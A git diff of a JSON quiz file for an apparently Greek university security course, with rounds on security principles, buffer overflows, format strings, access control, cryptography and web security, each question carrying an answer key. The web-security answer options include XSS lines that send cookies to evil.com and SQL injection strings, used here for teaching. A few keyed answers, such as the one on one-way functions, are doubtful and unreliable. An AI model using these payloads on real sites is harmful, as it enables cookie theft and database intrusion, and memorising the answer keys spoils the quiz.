@@ -1,13 +1,639 @@
 [
   {
     "id": 1,
-    "title": "Stack Basics",
+    "title": "Security Fundamentals",
     "questions": [
       {
-        "question": "What is a stack?",
-        "answers": ["A queue", "A LIFO structure", "A tree", "A graph"],
-        "correctAnswer": "A LIFO structure",
-        "photoURL": "test_img"
+        "question": "Είναι καλή ιδέα να χρησιμοποιώ scanf(\"%s\", buffer) στον κώδικά μου;",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q1q1"
+      },
+      {
+        "question": "Λόγω ενός πρόσφατου data-breach όλοι οι αριθμοί κοινωνικής ασφάλισης των χρηστών μας έγιναν leak. Αυτό είναι πρόβλημα:",
+        "answers": ["Confidentiality", "Integrity", "Availability", "Authenticity"],
+        "correctAnswer": "Confidentiality",
+        "photo": "q1q2"
+      },
+      {
+        "question": "We always include the adversary's strategy in our adversary definition.",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q1q3"
+      },
+      {
+        "question": "Ποιο από τα παρακάτω ΔΕΝ αποτελεί μέρος του Trusted Computing Base (TCB) του Mars Rover;",
+        "answers": [
+          "Το Hardware του Mars Rover",
+          "Το Real Time Operating System (RTOS) του",
+          "Το λογισμικό επικοινωνίας που τρέχει στον επίγειο σταθμό",
+          "Το λογισμικό επικοινωνίας που τρέχει στο Mars Rover"
+        ],
+        "correctAnswer": "Το λογισμικό επικοινωνίας που τρέχει στον επίγειο σταθμό",
+        "photo": "q1q4"
+      },
+      {
+        "question": "Στους μεγάλους οργανισμούς η πλειοψηφία των χρηστών δεν έχουν root access στον υπολογιστή τους. Αυτό είναι παράδειγμα:",
+        "answers": [
+          "Authenticity",
+          "Economy of Mechanism (KISS)",
+          "Complete mediation",
+          "Least privilege"
+        ],
+        "correctAnswer": "Least privilege",
+        "photo": "q1q5"
+      },
+      {
+        "question": "Το να \"κρύβουμε\" το κλειδί κάτω από το χαλάκι είναι",
+        "answers": [
+          "Λάθος - Security through obscurity",
+          "Σωστό - Least privilege",
+          "Λάθος - Separation of Duty",
+          "Λάθος - εμείς το κρύβουμε στο γλαστράκι"
+        ],
+        "correctAnswer": "Λάθος - Security through obscurity",
+        "photo": "q1q6"
+      },
+      {
+        "question": "Κάναμε ένα exploit στο οποίο αλλάξαμε το expected password γράφοντας εκτός ενός buffer. Αυτό είναι πρόβλημα:",
+        "answers": [
+          "Confidentiality",
+          "Integrity",
+          "Authenticity",
+          "Των άλλων, εμένα παίζει το exploit :)"
+        ],
+        "correctAnswer": "Integrity",
+        "photo": "q1q7"
+      },
+      {
+        "question": "Οι IT προμήθειες ενός οργανισμού σχεδιάζονται και εγκρίνονται αποκλειστικά από τον VP of IT. Αυτό είναι:",
+        "answers": [
+          "Καλό γιατί έχει Complete Mediation για το τι αγοράζεται",
+          "Κακό γιατί δεν υπάρχει Separation of Duty",
+          "Καλό γιατί αυτό είναι ένα Fail-safe Default",
+          "Κακό γιατί δεν ακολουθεί το Least Privilege"
+        ],
+        "correctAnswer": "Κακό γιατί δεν υπάρχει Separation of Duty",
+        "photo": "q1q8"
+      },
+      {
+        "question": "Ένα σύστημα βιομετρικής αναγνώρισης προσώπου πρέπει να λύνει το πρόβλημα του",
+        "answers": ["Confidentiality", "Authenticity", "Integrity", "Availability"],
+        "correctAnswer": "Authenticity",
+        "photo": "q1q9"
+      },
+      {
+        "question": "Ένας γραφολόγος ελέγχει την υπογραφή μας σε ένα συμβόλαιο για να εγγυηθεί το",
+        "answers": ["Confidentiality", "Integrity", "Authenticity", "Availability"],
+        "correctAnswer": ["Integrity", "Authenticity"],
+        "photo": "q1q10"
+      },
+      {
+        "question": "Στο αεροδρόμιο ελέγχουν τα εισιτήρια/διαβατήριο μας σε πολλαπλά, συνεχόμενα checkpoints. Αυτό είναι παράδειγμα:",
+        "answers": [
+          "Least privilege",
+          "No security through obscurity",
+          "Defense in depth",
+          "Separation of Duty"
+        ],
+        "correctAnswer": "Defense in depth",
+        "photo": "q1q11"
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "title": "x86 and Buffer Overflows",
+    "questions": [
+      {
+        "question": "Στο βιβλίο του Douglas Adams - Hitchhiker's Guide to the Galaxy η απάντηση στα πάντα είναι 42 επειδή",
+        "answers": [
+          "Του άρεσε το 42",
+          "Είναι ο ASCII κωδικός του 'Β'",
+          "Είναι ο ASCII κωδικός του '*'",
+          "Παρακαλώ;"
+        ],
+        "correctAnswer": "Είναι ο ASCII κωδικός του '*'",
+        "photo": "q2q1"
+      },
+      {
+        "question": "Ποιο από τα παρακάτω δεν είναι όνομα καταχωρητή σε x86;",
+        "answers": ["Frame Pointer", "Stack Pointer", "Instruction Pointer", "Laser Pointer"],
+        "correctAnswer": "Laser Pointer",
+        "photo": "q2q2"
+      },
+      {
+        "question": "Η στοίβα μεγαλώνει προς",
+        "answers": ["μεγαλύτερες διευθύνσεις (πάνω)", "μικρότερες διευθύνσεις (κάτω)"],
+        "correctAnswer": "μικρότερες διευθύνσεις (κάτω)",
+        "photo": "q2q3"
+      },
+      {
+        "question": "Όταν καλούμε μια συνάρτηση foo(arg1, arg2, arg3) σε x86 τα ορίσματα μπαίνουν στην στοίβα με σειρά:",
+        "answers": ["Από δεξιά προς τα αριστερά", "Από αριστερά προς τα δεξιά"],
+        "correctAnswer": "Από δεξιά προς τα αριστερά",
+        "photo": "q2q4"
+      },
+      {
+        "question": "Η εντολή push %eax σε 32-bit x86 assembly μειώνει τον stack pointer esp κατά",
+        "answers": ["-2", "2", "4", "8"],
+        "correctAnswer": "4",
+        "photo": "q2q5"
+      },
+      {
+        "question": "Αν αντιστρέψω την κατεύθυνση με την οποία γράφω τα στοιχεία ενός πίνακα στην μνήμη δεν θα είχα buffer overflows",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q2q6"
+      },
+      {
+        "question": "Η συνάρτησή μας τελείωσε - πόσο αυξήθηκε ο SP κατά τον ακόλουθο επίλογο (32-bit);",
+        "answers": ["1", "4", "8", "12"],
+        "correctAnswer": "8",
+        "photo": "q2q7"
+      },
+      {
+        "question": "Η εντολή με την οποία τοποθετώ ένα breakpoint σε x86 έχει κωδικό:",
+        "answers": ["0x90", "0x42", "0xCC", "0xGG"],
+        "correctAnswer": "0xCC",
+        "photo": "q2q8"
+      },
+      {
+        "question": "[Περσινό θέμα] Μόλις τρέξαμε αυτές τις εντολές στην αρχή της συνάρτησης, ο Stack Pointer (SP) μειώθηκε κατά:",
+        "answers": ["42", "66", "70", "Trick question - αυξήθηκε!"],
+        "correctAnswer": "70",
+        "photo": "q2q9"
+      },
+      {
+        "question": "Ο ebp έχει την τιμή 32, ποια η τιμή του eax μετά την εντολή lea -0x10(%ebp),%eax;",
+        "answers": ["22", "42", "16", "Δεν μπορούμε να ξέρουμε"],
+        "correctAnswer": "16",
+        "photo": "q2q10"
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "title": "Format Strings and Mitigations",
+    "questions": [
+      {
+        "question": "Πόσους χαρακτήρες θα τυπώσει το printf(\"%5$42c\") ;",
+        "answers": ["5", "42", "43", "Δεν κάνει compile"],
+        "correctAnswer": "42",
+        "photo": "q3q1"
+      },
+      {
+        "question": "Ποιο από τα παρακάτω δεν είναι control flow hijack mitigation;",
+        "answers": ["NX", "ASLR", "Canaries", "Session Cookies"],
+        "correctAnswer": "Session Cookies",
+        "photo": "q3q2"
+      },
+      {
+        "question": "Ποια άμυνα δημιουργήθηκε για να εμποδίσει το shellcode injection;",
+        "answers": ["Stack Canaries", "Stack Guard", "DEP", "ASLR"],
+        "correctAnswer": "DEP",
+        "photo": "q3q3"
+      },
+      {
+        "question": "Ποια τεχνική μπορεί να χρησιμοποιηθεί ενάντια στο DEP;",
+        "answers": [
+          "Όλα τα παρακάτω",
+          "ret2libc",
+          "Function pointer overwrite",
+          "ret2pop",
+          "ret2got",
+          "ret2text"
+        ],
+        "correctAnswer": "Όλα τα παρακάτω",
+        "photo": "q3q4"
+      },
+      {
+        "question": "Ποιο είναι το canary που παρέχει την λιγότερη ασφάλεια;",
+        "answers": ["Random canary", "Terminator", "Hardcoded at compile time", "No canary"],
+        "correctAnswer": "No canary",
+        "photo": "q3q5"
+      },
+      {
+        "question": "Ποια τεχνική μπορεί να ξεπεράσει την ασφάλεια των stack canaries;",
+        "answers": [
+          "Format string attack",
+          "Function Pointer Overwrite",
+          "Pointer Subterfuge",
+          "Όλα τα παραπάνω"
+        ],
+        "correctAnswer": "Όλα τα παραπάνω",
+        "photo": "q3q6"
+      },
+      {
+        "question": "Τι μπορεί να μειώσει την αποτελεσματικότητα του ASLR;",
+        "answers": [
+          "32-bit address space",
+          "Παρουσία non-PIE κώδικα",
+          "Memory leaks",
+          "Όλα τα παραπάνω"
+        ],
+        "correctAnswer": "Όλα τα παραπάνω",
+        "photo": "q3q7"
+      },
+      {
+        "question": "Thankfully, buffer overflows, ROP chains and similar attacks are no longer a problem thanks to modern defenses.",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q3q8"
+      },
+      {
+        "question": "Τι θα τυπώσει το printf(\"%2$s %2$s\", \"have\", \"a\", \"great\", \"day\");",
+        "answers": ["Θα κρασάρει", "a day", "a a", "have a"],
+        "correctAnswer": "a a",
+        "photo": "q3q9"
+      },
+      {
+        "question": "Τι θα τυπώσει το int n1, n2; printf(\"hi%nworld%n\", &n1, &n2); printf(\" %d %d\", n1, n2);",
+        "answers": ["hi world 0 0", "hi world 7 7", "hiworld2 7", "Will not compile"],
+        "correctAnswer": "hiworld2 7",
+        "photo": "q3q10"
+      },
+      {
+        "question": "Τι θα τυπώσει η printf(\"%3$x\"); αν η στοίβα έχει ως εξής",
+        "answers": ["41414141", "41", "42424242", "43434343"],
+        "correctAnswer": "43434343",
+        "photo": "q3q11"
+      },
+      {
+        "question": "Τι θα τυπώσει η printf(\"%3$c\"); αν η στοίβα έχει ως εξής",
+        "answers": ["41", "42", "43", "C"],
+        "correctAnswer": "C",
+        "photo": "q3q11"
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "title": "Access Control & CFI",
+    "questions": [
+      {
+        "question": "Το πρόβλημα του Access Control έχει λυθεί και εφαρμόζεται με τον ίδιο δομημένο τρόπο σε όλη την βιομηχανία",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q4q1"
+      },
+      {
+        "question": "Μπορώ να έχω RBAC και DAC;",
+        "answers": ["True", "False"],
+        "correctAnswer": "True",
+        "photo": "q4q2"
+      },
+      {
+        "question": "Ένας reference monitor χρειάζεται Complete Mediation για να εφαρμόσει πολιτικές (policies)",
+        "answers": ["True", "False"],
+        "correctAnswer": "True",
+        "photo": "q4q3"
+      },
+      {
+        "question": "Ποιο από τα παρακάτω δεν είναι όνομα User ID που έχει κάθε διεργασία (process) σε Linux;",
+        "answers": ["Real User ID", "Saved User ID", "Session User ID", "Effective User ID"],
+        "correctAnswer": "Session User ID",
+        "photo": "q4q4"
+      },
+      {
+        "question": "Γιατί δεν χρησιμοποιούμε τον Lampson's Matrix σε όλα τα συστήματα σήμερα;",
+        "answers": [
+          "Δεν υποστηρίζει authorization checks",
+          "Είναι απαγορευτικά μεγάλος / μη αποδοτικός",
+          "Δεν υποστηρίζει authentication checks",
+          "Τυπογραφικό, είναι Sampson's Matrix"
+        ],
+        "correctAnswer": "Είναι απαγορευτικά μεγάλος / μη αποδοτικός",
+        "photo": "q4q5"
+      },
+      {
+        "question": "Σε ποια περίπτωση θα προτιμούσατε MAC (Mandatory) έναντι DAC (Discretionary);",
+        "answers": [
+          "Σε μια πλατφόρμα μοιράσματος διαδικτυακών βιντεοπαιχνιδιών",
+          "Σε blogging προϊόν που οι χρήστες επιλέγουν με ποιους μοιράζονται τα posts",
+          "Σε SaaS προϊόν όπου επιτρέπει σε χρήστες να φτιάχνουν groups και ρόλους",
+          "Σε μια στρατιωτική εγκατάσταση για την πρόσβαση σε κρατικά μυστικά"
+        ],
+        "correctAnswer": "Σε μια στρατιωτική εγκατάσταση για την πρόσβαση σε κρατικά μυστικά",
+        "photo": "q4q6"
+      },
+      {
+        "question": "Έγραψα ανάλυση που ελέγχει: \"αν ο κώδικάς σου έχει strcpy τότε είναι ανασφαλής\". Για buffer overflows η ανάλυση είναι:",
+        "answers": ["Unsound and Incomplete", "Complete", "Sound", "Sound and Complete"],
+        "correctAnswer": "Unsound and Incomplete",
+        "photo": "q4q7"
+      },
+      {
+        "question": "Έγραψα ανάλυση που ελέγχει: \"αν ο κώδικάς σου κρασάρει με segmentation fault τότε είναι ανασφαλής\". Η ανάλυση είναι:",
+        "answers": [
+          "Sound",
+          "Complete",
+          "Good",
+          "Δεν μπορώ να αποφανθώ γιατί δεν ξέρω ποια είναι η ιδιότητα που ελέγχω"
+        ],
+        "correctAnswer": "Δεν μπορώ να αποφανθώ γιατί δεν ξέρω ποια είναι η ιδιότητα που ελέγχω",
+        "photo": "q4q8"
+      },
+      {
+        "question": "Ποια από τα παρακάτω δεν αποτελεί πρόκληση για το CFI;",
+        "answers": ["Callbacks", "Virtual Tables", "Direct Branches", "Dynamic Linking"],
+        "correctAnswer": "Direct Branches",
+        "photo": "q4q9"
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "title": "Intro to Crypto",
+    "questions": [
+      {
+        "question": "Έστω x = 42. Η τιμή της παράστασης x \\(\\oplus \\) 42 είναι:",
+        "answers": ["42", "0", "1", "\\(\\oplus \\)"],
+        "correctAnswer": "0",
+        "photo": "q5q1"
+      },
+      {
+        "question": "Ρωτήσαμε τον Αυγερινό αν θα βγάλει άλλες εργασίες και η απάντηση ήταν \"XKLINAZ\" (substitution cipher). Η απάντηση είναι:",
+        "answers": [
+          "Μάλλον",
+          "Ίσως",
+          "Όχι",
+          "Σίγουρα"
+        ],
+        "correctAnswer": "Σίγουρα",
+        "photo": "q5q2"
+      },
+      {
+        "question": "The One Time Pad offers perfect secrecy",
+        "answers": ["True", "False"],
+        "correctAnswer": "True",
+        "photo": "q5q3"
+      },
+      {
+        "question": "Χρησιμοποιώ one time pad και επιτρέπω το κλειδί \"0\" να επιλέγει τυχαία. Αυτό είναι :",
+        "answers": [
+          "Καλό",
+          "Κακό",
+          "Κάκιστο",
+          "Δεν έχει σημασία"
+        ],
+        "correctAnswer": "Καλό",
+        "photo": "q5q4"
+      },
+      {
+        "question": "Στο Linux έχω Access Control Lists by default;",
+        "answers": ["True", "False"],
+        "correctAnswer": "True",
+        "photo": "q5q5"
+      },
+      {
+        "question": "Τα capabilities στον πίνακα του Lampson αναπαρίστανται με",
+        "answers": [
+          "Γραμμές",
+          "Στήλες",
+          "Διαγωνίους",
+          "Οφιοειδείς γραμμές"
+        ],
+        "correctAnswer": "Γραμμές",
+        "photo": "q5q6"
+      },
+      {
+        "question": "Who is the strongest adversary in the secrecy game?",
+        "answers": [
+          "Chosen Plaintext Attack (CPA)",
+          "Known Plaintext Attack (KPA)",
+          "Chosen Ciphertext Attack (CCA)",
+          "Ciphertext Only"
+        ],
+        "correctAnswer": "Chosen Ciphertext Attack (CCA)",
+        "photo": "q5q7"
+      },
+      {
+        "question": "The One Time Pad offers secure communication",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q5q8"
+      },
+      {
+        "question": "Έχω ένα plaintext m και ένα ciphertext c και χρήση OTP. Τα κλειδιά έχουν 128 bits πόσα κλειδιά k κάνουν map το m στο c;",
+        "answers": [
+          "0",
+          "1",
+          "2",
+          "\\( 2^{128} \\)"
+        ],
+        "correctAnswer": "1",
+        "photo": "q5q9"
+      },
+      {
+        "question": "Ο κανόνας που λέει ότι ο αλγόριθμος του κρυπτοσυστήματος πρέπει να είναι \"ανοιχτός\" αποδίδεται στον",
+        "answers":[
+          "Kirchhoff",
+          "Captain Kirk",
+          "Kerckhoffs",
+          "Gandalf"
+        ],
+        "correctAnswer": "Kerckhoffs",
+        "photo": "q5q10"
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "title": "Pseudorandom Functions and Permutations",
+    "questions": [
+      {
+        "question": "Randomness and Pseudorandomness are different terms for the exact same concept",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q6q1"
+      },
+      {
+        "question": "Κατά τον Αυγερινό η μέθοδος του ανεμιστήρα κατά την βαθμολόγηση γραπτών είναι",
+        "answers": [
+          "Random",
+          "Pseudorandom",
+          "Μια εξαιρετική τακτική",
+          "Λάθος, προτιμάει την μέθοδο της γάτας"
+        ],
+        "correctAnswer": "Pseudorandom",
+        "photo": "q6q2"
+      },
+      {
+        "question": "Πόσες αντιμεταθέσεις (permutations) της μορφής \\( F: X \\rightarrow X \\) υπάρχουν;",
+        "answers": [
+          "\\( \\midX\\mid! \\)",
+          "\\( 2 \\times \\midX\\mid \\)",
+          "\\( \\midX\\mid^2 \\)",
+          "\\( \\midX\\mid^{\\midX\\mid} \\)"
+        ],
+        "correctAnswer": "\\( \\midX\\mid! \\)",
+        "photo": "q6q3"
+      },
+      {
+        "question": "Encoding offers the same secrecy guarantees as encryption",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q6q4"
+      },
+      {
+        "question": "One-way functions exist",
+        "answers": ["True", "False"],
+        "correctAnswer": "False",
+        "photo": "q6q5"
+      },
+      {
+        "question": "Αποφάσισα να βελτιώσω την ασφάλεια της εφαρμογής μου υλοποιώντας το δικό μου block cipher. Καλή ιδέα;",
+        "answers": [
+          "True",
+          "False"
+        ],
+        "correctAnswer": "False",
+        "photo": "q6q6"
+      },
+      {
+        "question": "Θέλω να χρησιμοποιήσω ένα block cipher για το σύστημά μου, προτείνω:",
+        "answers": [
+          "DES",
+          "2DES",
+          "3DES",
+          "AES"
+        ],
+        "correctAnswer": "AES",
+        "photo": "q6q7"
+      },
+      {
+        "question": "Ποιο από τα παρακάτω δεν είναι μήκος κλειδιού για το AES?",
+        "answers": ["64", "128", "192", "256"],
+        "correctAnswer": "64",
+        "photo": "q6q8"
+      },
+      {
+        "question": "Let \\( F: K \\times X \\rightarrow X \\) be a secure PRF. Is \\( G(K, X) = F(K, F(K, X)) \\) a secure PRF?",
+        "answers": ["True", "False"],
+        "correctAnswer": "True",
+        "photo": "q6q9"
+      }
+    ]
+  },
+  {
+    "id": 7,
+    "title": "Web Security",
+    "questions": [
+      {
+        "question": "Τσέκαρες τα email σου στο τοπικό beach cafe. Ευτυχώς πριν φύγεις έκανες logout. Τα δεδομένα σου είναι ασφαλή;",
+        "answers": [
+          "Σίγουρα",
+          "Σίγουρα όχι",
+          "Εξαρτάται",
+          "Δεν πάω παραλία"
+        ],
+        "correctAnswer": "Εξαρτάται",
+        "photo": "q7q1"
+      },
+      {
+        "question": "I need to see query output to figure out the contents of a DB",
+        "answers": [
+          "True",
+          "False"
+        ],
+        "correctAnswer": "False",
+        "photo": "q7q2"
+      },
+      {
+        "question": "Cookie content can always be trusted by the server",
+        "answers": [
+          "True",
+          "False"
+        ],
+        "correctAnswer": "False",
+        "photo": "q7q3"
+      },
+      {
+        "question": "XSS takes advantage of",
+        "answers": [
+          "The gullibility of the exploited user",
+          "The Same Origin Policy",
+          "The browser + frontend's trust in the web server",
+          "The web server's trust in the browser + frontend"
+        ],
+        "correctAnswer": "The browser + frontend's trust in the web server",
+        "photo": "q7q4"
+      },
+      {
+        "question": "I just XSS'ed a user on site.com. I'll use this attack to send their bank.com cookies to me. How will I do this?",
+        "answers": [
+          "<script>alert(document.cookie)</script>",
+          "<script>window.location=https://evil.com?foo=document.cookie</script>",
+          "<script>fetch(https://evil.com?foo=document[\"bank.com\"].cookie)</script>",
+          "Won't work because of Same Origin Policy"
+        ],
+        "correctAnswer": "Won't work because of Same Origin Policy",
+        "photo": "q7q5"
+      },
+      {
+        "question": "Someone just SQL injected our DB and leaked everyone's passwords. What do I do?",
+        "answers": [
+          "Nothing, all passwords are salted and hashed with PBKDF2 so we are good",
+          "I coordinate with incident response team following company policy",
+          "I email all users to let them know and force a password reset",
+          "I try to find the exploited bug and remediate as quickly as possible"
+        ],
+        "correctAnswer": "I coordinate with incident response team following company policy",
+        "photo": "q7q6"
+      },
+      {
+        "question": "Using a modern and mature JS framework like React ensures XSS vulnerabilities are eliminated",
+        "answers": [
+          "True",
+          "False"
+        ],
+        "correctAnswer": "False",
+        "photo": "q7q7"
+      },
+      {
+        "question": "CSRF takes advantage of",
+        "answers": [
+          "The gullibility of the exploited user",
+          "The Same Origin Policy",
+          "The browser + frontend's trust in the web server",
+          "The web server's trust in the browser + frontend"
+        ],
+        "correctAnswer": "The web server's trust in the browser + frontend",
+        "photo": "q7q8"
+      },
+      {
+        "question": "PM is asking me to implement authentication on the client side, I",
+        "answers": [
+          "hide the password in some obfuscated javascript to thwart the adversaries",
+          "use secure SHA256 to first hash the password and only include that",
+          "use typescript which is safe for that",
+          "call them a fool"
+        ],
+        "correctAnswer": "call them a fool",
+        "photo": "q7q9"
+      },
+      {
+        "question": "Every horror movie could start with this line",
+        "answers": [
+          "I have a great idea for a SQL sanitization routine",
+          "I have a great idea for a shell command sanitization routine",
+          "I have a great idea for a new secure cookie generation routine",
+          "Por qué no los tres?"
+        ],
+        "correctAnswer": "Por qué no los tres?",
+        "photo": "q7q10"
+      },
+      {
+        "question": "Found a way to stop SQL injections! Just strip the comment character! Can I be defeated?",
+        "answers": [
+          "' or 1 = 1 --",
+          "' or '1' = '1'",
+          "' or '1' = '1",
+          "No, this sanitization mechanism is unbreakable"
+        ],
+        "correctAnswer": "' or '1' = '1'",
+        "photo": "q7q11"
       }
     ]
   }
